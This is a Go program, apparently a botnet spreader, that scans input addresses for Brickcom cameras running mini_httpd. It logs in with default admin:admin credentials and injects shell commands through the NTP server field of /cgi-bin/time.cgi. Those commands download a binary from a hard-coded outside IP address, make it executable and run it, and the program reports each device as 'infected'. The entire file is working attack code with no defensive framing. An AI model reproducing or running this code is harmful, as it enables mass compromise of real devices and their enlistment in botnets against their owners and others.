package main

import (
	"net"
	"os"
	"time"
	"fmt"
	"strings"
	"sync"
	"bufio"
	"io"
	"bytes"
	"strconv"
)

var (
	port = os.Args[1]

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found uint64
	exploited uint64

	payload = "wget${IFS}http://92.119.159.25/vc${IFS}-O${IFS}/tmp/vc"
	payload2 = "chmod${IFS}777${IFS}/tmp/vc"
	payload3 = "/tmp/vc"
)

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Server: mini_httpd")
}

func checkHtml(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /index_mjpg.html HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "/cgi-bin/wledctl.cgi")
}

func sendPayload(target, pyld string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "action=set&type=2&timezoneID=14&country=User Defined&offsetHours=13&offsetMinutes=0&ntp.ntpServerLoc1=$(" + pyld + ")&ntp.ntpServerLoc2=clock.stdtime.gov.tw&enableDST=1&DayPeriod=0&StartMonth=1&EndMonth=1&StartDay=1&EndDay=1"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /cgi-bin/time.cgi HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nOrigin: http://" + target + "\r\nReferer: http://" + target + "/date_time_config.html\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	fmt.Printf("%s\n", buff.String())

	if strings.Contains(buff.String(), "statusString=successfully") {
		fmt.Printf("[BRICKCOM] %s infected\n", target)
	}
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	if !checkHtml(target) {
		return
	}

	found++

	fmt.Printf("[BRICKCOM] found %s\n", target)

	sendPayload(target, payload)
	time.Sleep(10 * time.Second)
	sendPayload(target, payload2)
	time.Sleep(10 * time.Second)
	sendPayload(target, payload3)
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}

